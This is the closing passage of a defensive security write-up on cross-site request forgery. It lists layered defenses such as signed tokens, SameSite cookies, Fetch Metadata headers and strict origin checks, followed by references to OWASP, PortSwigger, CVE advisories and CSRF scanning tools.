- **CORS** only prevents response *reading*, not request *sending* — the state-changing side effect occurs regardless (§5-2).

Each defense addresses one aspect of the CSRF problem while leaving others exposed. Modern applications layer multiple defenses (defense in depth), but the interaction between layers (e.g., SameSite + CORS + Content-Type) creates combinatorial complexity where any single misconfiguration opens an attack path.

### Structural Solutions

A truly robust CSRF defense requires addressing ambient authority at its source:

1. **Mandatory CSRF tokens with HMAC signing** bound to sessions, validated on all state-changing endpoints, and rotated periodically
2. **SameSite=Strict** cookies where cross-site functionality is not required, with `Lax` as a minimum baseline
3. **Fetch Metadata headers** (`Sec-Fetch-Site`, `Sec-Fetch-Mode`) for server-side request context verification — this is the most promising modern defense as the header value is set by the browser and cannot be forged by JavaScript
4. **Custom request headers** (e.g., `X-Requested-With`) as a simple but effective CORS preflight trigger
5. **Session regeneration** on authentication state changes to prevent fixation chains
6. **Origin validation with strict parsing** — exact scheme + host + port comparison, never substring matching

The ultimate architectural evolution is toward **token-bound sessions** and **origin-based isolation** (as embodied by Fetch Metadata), where the browser provides cryptographic or unforgeable context about every request, eliminating the need for application-layer token management entirely.

---

## References

- OWASP Cross-Site Request Forgery Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
- PortSwigger Web Security Academy: CSRF — https://portswigger.net/web-security/csrf
- PortSwigger: Bypassing SameSite Cookie Restrictions — https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions
- PortSwigger: Bypassing CSRF Token Validation — https://portswigger.net/web-security/csrf/bypassing-token-validation
- Intigriti CSRF Advanced Exploitation Guide — https://www.intigriti.com/researchers/blog/hacking-tools/csrf-a-complete-guide-to-exploiting-advanced-csrf-vulnerabilities
- DEF CON 30: "The CSRF Resurrections" (Service Worker + SameSite + Fetch) — https://forum.defcon.org/node/242201
- Include Security: Cross-Site WebSocket Hijacking Exploitation in 2025 — https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/
- Apollo GraphQL: CSRF Prevention — https://www.apollographql.com/docs/graphos/routing/security/csrf
- Mozilla Bug #1658869: SameSite Bypass via Service Worker FetchEvent — https://bugzilla.mozilla.org/show_bug.cgi?id=1658869
- W3C Fetch Metadata Specification — https://github.com/w3c/webappsec-fetch-metadata
- Google Web.dev: Protect Resources with Fetch Metadata — https://web.dev/articles/fetch-metadata
- Stanford WebSec: Robust Defenses for Cross-Site Request Forgery — https://seclab.stanford.edu/websec/csrf/csrf.pdf
- Cobalt CSRF & Bypasses — https://www.cobalt.io/learning-center/csrf-bypasses
- CWE-352: Cross-Site Request Forgery — https://cwe.mitre.org/data/definitions/352.html
- MDN: Cross-site request forgery (CSRF) — https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/CSRF
- Auth0: Prevent CSRF Attacks in OAuth 2.0 — https://auth0.com/blog/prevent-csrf-attacks-in-oauth-2-implementations/
- CVE-2024-48962 (Apache OFBiz SameSite Bypass) — https://seclists.org/oss-sec/2024/q4/95
- CVE-2025-34291 (Langflow CSRF to ATO+RCE) — https://www.obsidiansecurity.com/blog/cve-2025-34291-critical-account-takeover-and-rce-vulnerability-in-the-langflow-ai-agent-workflow-platform
- XSRFProbe — https://github.com/0xInfection/XSRFProbe
- Bolt CSRF Scanner — https://github.com/s0md3v/Bolt

---

*This document was created for defensive security research and vulnerability understanding purposes.*
